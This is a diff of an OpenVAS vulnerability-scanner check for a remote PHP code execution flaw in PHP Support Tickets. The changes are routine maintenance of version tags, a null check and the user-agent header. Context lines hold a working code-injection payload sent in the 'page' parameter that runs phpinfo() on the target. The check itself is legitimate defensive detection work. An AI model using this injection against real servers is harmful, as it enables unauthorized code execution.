@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_php_support_tickets_49567.nasl 11343 2018-09-12 06:36:46Z cfischer $
+# $Id: gb_php_support_tickets_49567.nasl 13660 2019-02-14 09:48:45Z cfischer $
 #
 # PHP Support Tickets 'page' Parameter Remote PHP Code Execution Vulnerability
 #
@@ -29,8 +29,8 @@ CPE = "cpe:/a:triangle_solutions:php_support_tickets";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103256");
-  script_version("$Revision: 11343 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-12 08:36:46 +0200 (Wed, 12 Sep 2018) $");
+  script_version("$Revision: 13660 $");
+  script_tag(name:"last_modification", value:"$Date: 2019-02-14 10:48:45 +0100 (Thu, 14 Feb 2019) $");
   script_tag(name:"creation_date", value:"2011-09-14 13:31:57 +0200 (Wed, 14 Sep 2011)");
   script_bugtraq_id(49567);
   script_tag(name:"cvss_base", value:"7.5");
@@ -75,7 +75,8 @@ if(!dir  = get_app_location(port:port, cpe:CPE)) exit(0);
 url = string(dir, "/index.php");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
-if( buf == NULL ) exit(0);
+if(!buf)
+  exit(0);
 
 session_id = eregmatch(pattern:"Set-Cookie: PHPSESSID=([^;]+)", string:buf);
 if(isnull(session_id[1])) exit(0);
@@ -83,10 +84,12 @@ sess = session_id[1];
 
 url = string(dir, "/index.php?page=xek()%3Bfunction+PHPST_PAGENAME_XEK(){phpinfo()%3B}");
 
+useragent = http_get_user_agent();
 host = http_host_name(port:port);
+
 req = string("GET ", url, " HTTP/1.1\r\n",
 	     "Host: ", host, "\r\n",
-	     "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
+	     "User-Agent: ", useragent, "\r\n",
 	     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
 	     "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n",
 	     "Accept-Encoding: gzip, deflate\r\n",
